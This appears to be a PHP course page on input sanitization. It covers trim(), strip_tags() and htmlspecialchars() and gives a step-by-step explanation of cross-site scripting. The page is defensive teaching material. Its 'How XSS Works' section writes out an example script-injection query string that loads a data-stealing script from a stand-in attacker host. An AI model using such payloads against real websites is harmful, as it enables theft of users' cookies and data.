---
layout: base
title: PHP - Sanitization
course: SDEV255
---

- [Sanitization](#sanitization)
  - [Validation vs Sanitization](#validation-vs-sanitization)
  - [Purpose of Sanitization](#purpose-of-sanitization)
  - [Removing Unwanted Values](#removing-unwanted-values)
    - [trim()](#trim)
    - [strip\_tags()](#strip_tags)
  - [Escaping Values](#escaping-values)
    - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
      - [How XSS Works](#how-xss-works)
      - [XSS Example](#xss-example)
    - [htmlspecialchars()](#htmlspecialchars)
  - [Topics for Later](#topics-for-later)

# Sanitization

## Validation vs Sanitization

**Validation** - is the process of ensuring that the input matches the expected format, range, type, length, etc.

**Sanitization** - is the process of removing unwanted characters, whitespace, HTML tags, etc.

## Purpose of Sanitization

- Prevents malicious code from being injected into application
- Prevents unwanted characters from being
  - Displayed to the user
  - Stored in database
  - Stored in files
  - Sent to other applications

## Removing Unwanted Values

### trim()

- Removes whitespace from beginning and end of a string
- May optionally specify which characters to remove

```php
$cleanedInput = trim($userInput);
```

### strip_tags()

- Removes HTML tags from a string
- May optionally specify which tags to allow

```php
$cleanedInput = strip_tags($userInput);
```

## Escaping Values

**Escaping** - is the process of converting special characters to their HTML entity equivalents.

### Cross-Site Scripting (XSS)

**Cross-Site Scripting (XSS)** - is a type of injection attack where malicious scripts are injected into trusted websites.

The scripts may then:

- Steal cookies and session tokens
- Redirect the user to another website
- Send content to other applications

#### How XSS Works

1. Hacker visits a website and probes for query string vulnerabilities.
<figure>
    <span>
        <img src="images/hacker.jpg" style="width:40%;">
    </span>
</figure>

2. Hacker finds query string named `q` is not sanitized.

3. Hacker tricks other people into visiting website with following query string: `q=<script src=http://really-terrible-site/steal-data.js></script>`

4. JS file runs on victim's browser and sends data to hacker's website.

5. Hacker sells data on the dark web and buys yacht.

<figure>
    <span>
        <img src="https://media.boatsnews.com/src/images/news/articles/ima-computer-science-screen-37738.webp" style="width:40%">
    </span>
</figure>

#### XSS Example

<p class="demo">Walkthrough</p>

[Text: Example of an XSS Attack](http://localhost/phpbook/section_b/c06/)

### htmlspecialchars()

- Converts special characters to HTML entities
- May optionally specify which characters to convert and the character encoding

```php
$input = '<script>alert("XSS");</script>';
<p><?php echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8'); ?></p
```

## Topics for Later

We have not covered these yet, but santization is also important for:

- Database queries
- File uploads
